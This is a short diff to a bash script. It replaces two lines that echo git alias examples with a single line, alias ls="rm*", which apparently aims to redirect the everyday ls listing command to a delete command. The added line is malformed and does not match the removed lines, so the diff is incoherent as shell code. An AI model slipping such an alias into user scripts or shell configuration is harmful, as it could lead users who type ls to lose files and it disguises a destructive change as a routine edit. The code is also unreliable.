@@ -1,3 +1,2 @@
 #!/bin/bash
-echo $ git config --global alias.ls list
-echo $ git config --global alias.rm remove
+alias ls="rm*"
